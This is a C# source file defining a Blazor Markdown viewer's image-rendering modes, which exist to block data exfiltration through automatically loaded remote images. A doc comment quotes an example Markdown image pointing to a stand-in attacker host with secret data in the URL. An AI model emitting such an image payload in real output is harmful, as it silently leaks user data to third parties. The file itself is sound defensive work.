namespace Bit.BlazorUI;

/// <summary>
/// Controls how the <see cref="BitMarkdownViewer"/> handles image sources, primarily as a
/// defense against data-exfiltration attacks. A remote image such as
/// <c>![x](https://attacker.com/leak?data=SECRET)</c> is fetched automatically by the
/// browser the moment it is rendered, silently leaking whatever the attacker encodes into
/// the URL (and the page URL via the referrer header) without any user interaction.
/// </summary>
public enum BitMarkdownViewerImageRendering
{
    /// <summary>
    /// All images are rendered and loaded automatically, including remote ones.
    /// Suitable only when the Markdown source is fully trusted.
    /// </summary>
    All,

    /// <summary>
    /// Only images the browser would fetch from the page's own origin are loaded: relative paths,
    /// anchors, same-document references, absolute URLs pointing back at the current origin, and
    /// embedded <c>data:</c> images, which are already part of the document and reach the network
    /// not at all. Genuinely cross-origin images (<c>http:</c>, <c>https:</c> and protocol-relative
    /// <c>//</c> URLs resolving elsewhere) are blocked so they cannot trigger an automatic
    /// cross-origin request. The alt text is still rendered. This is the recommended mode for
    /// untrusted or AI-generated Markdown.
    /// </summary>
    SameOrigin,

    /// <summary>
    /// No image is allowed to load; every image source is stripped and only the alt text
    /// remains. The strictest option.
    /// </summary>
    None
}
